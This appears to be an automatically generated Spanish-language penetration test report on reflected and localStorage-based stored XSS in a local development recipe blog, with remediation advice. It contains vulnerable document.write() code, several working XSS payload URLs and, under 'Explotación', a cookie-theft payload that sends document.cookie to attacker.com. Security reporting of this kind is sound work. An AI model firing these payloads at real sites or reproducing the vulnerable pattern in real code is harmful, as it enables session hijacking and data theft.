# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30 15:47:25  
**Analista:** Copilot Security Audit  
**Tipo de análisis:** Cross-Site Scripting (XSS)

---

## Resumen Ejecutivo

Se realizó un análisis de seguridad sobre la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`. Se identificaron **dos vulnerabilidades XSS** explotables: una de tipo **Reflected XSS** y una de tipo **Stored XSS** (almacenamiento en `localStorage` con renderizado sin sanitización).

---

## Descripción de la Aplicación

La aplicación es un blog de recetas que presenta:
- Un formulario de **búsqueda** (parámetro GET `search`)
- Un formulario de **comentarios** (parámetros GET `name` y `comment`)

Los valores de los parámetros se insertan directamente en el DOM mediante `document.write()` sin ningún tipo de sanitización o codificación de caracteres HTML.

---

## Vulnerabilidades Encontradas

### 1. Reflected XSS — Parámetro `search`

**Tipo:** Reflected Cross-Site Scripting  
**Severidad:** Alta (CVSS ~7.4)  
**Parámetro afectado:** `search` (método GET)

**Código vulnerable:**
```javascript
const searchTerm = urlParams.get('search');
// ...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

El valor del parámetro `search` se obtiene directamente de la URL y se concatena sin ninguna sanitización en una llamada a `document.write()`, lo que permite la inyección de HTML y JavaScript arbitrario.

**Payload de prueba:**
```
http://web.dev.local:8082/?search=</strong></p></div><script>alert('XSS-Reflected')</script>
```

**Impacto:** Un atacante puede enviar un enlace malicioso a una víctima. Cuando la víctima accede al enlace, el script se ejecuta en su navegador bajo el contexto de la aplicación, pudiendo robar cookies de sesión, redirigir a sitios maliciosos, o ejecutar acciones en nombre del usuario.

---

### 2. Stored XSS — Parámetros `name` y `comment`

**Tipo:** Stored Cross-Site Scripting (vía localStorage)  
**Severidad:** Alta (CVSS ~8.0)  
**Parámetros afectados:** `name` y `comment` (método GET)

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

// Se almacena en localStorage sin sanitización
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Se renderiza sin sanitización
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Los comentarios se almacenan en el `localStorage` del navegador sin sanitizar y se renderizan directamente con `document.write()`, lo que permite XSS persistente en el contexto del navegador del mismo usuario (y cualquier usuario del mismo dispositivo que acceda a la página).

**Payload de prueba:**
```
http://web.dev.local:8082/?name=Atacante&comment=<img src=x onerror="alert('XSS-Stored')">
```

**Impacto:** El script malicioso se ejecuta cada vez que la víctima visita la página mientras los comentarios permanecen en su `localStorage`. Esto puede usarse para:
- Robo de información del navegador
- Keylogging en la página
- Redirecciones maliciosas persistentes

---

## Explotación

### Exploit 1: Reflected XSS con robo de cookies

```
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Exploit 2: Stored XSS con payload persistente

```
http://web.dev.local:8082/?name=<script>alert(document.cookie)</script>&comment=Hola
```

### Exploit 3: XSS con bypass de etiqueta mediante atributo de evento

```
http://web.dev.local:8082/?search=</strong><img src=x onerror=alert('XSS')>
```

---

## Prueba de Concepto

| # | Tipo | Parámetro | Payload | Resultado Esperado |
|---|------|-----------|---------|-------------------|
| 1 | Reflected | `search` | `<script>alert(1)</script>` | Ejecución de JS en el navegador |
| 2 | Stored | `comment` | `<img src=x onerror=alert(1)>` | XSS almacenado en localStorage |
| 3 | Reflected | `name` | `<svg onload=alert(1)>` | Ejecución de JS mediante SVG |

---

## Causa Raíz

La causa raíz de ambas vulnerabilidades es la **ausencia total de sanitización** de los datos de entrada del usuario antes de insertarlos en el DOM. La aplicación utiliza `document.write()` con concatenación directa de strings, una práctica inherentemente insegura.

---

## Recomendaciones

1. **Sanitizar todas las entradas del usuario** antes de renderizarlas en el DOM. Usar funciones como:
   ```javascript
   function escapeHtml(text) {
       const div = document.createElement('div');
       div.appendChild(document.createTextNode(text));
       return div.innerHTML;
   }
   ```

2. **Reemplazar `document.write()`** por métodos seguros como `textContent` o `createElement`:
   ```javascript
   const p = document.createElement('p');
   p.textContent = 'Resultados para: ' + searchTerm;
   ```

3. **Implementar Content Security Policy (CSP)** en las cabeceras HTTP:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Validar y codificar los datos** antes de almacenarlos en `localStorage`.

5. **No utilizar GET para operaciones que manejen datos sensibles** o que sean persistidos.

---

## Conclusión

La aplicación web `http://web.dev.local:8082` presenta múltiples vulnerabilidades XSS críticas que permiten la ejecución de JavaScript arbitrario en el navegador de las víctimas. Estas vulnerabilidades son explotables sin autenticación y no requieren interacción del usuario más allá de visitar una URL maliciosa. Se recomienda corregir estas vulnerabilidades con carácter urgente.

---

*Informe generado automáticamente mediante análisis de código fuente y pruebas de penetración autorizadas.*
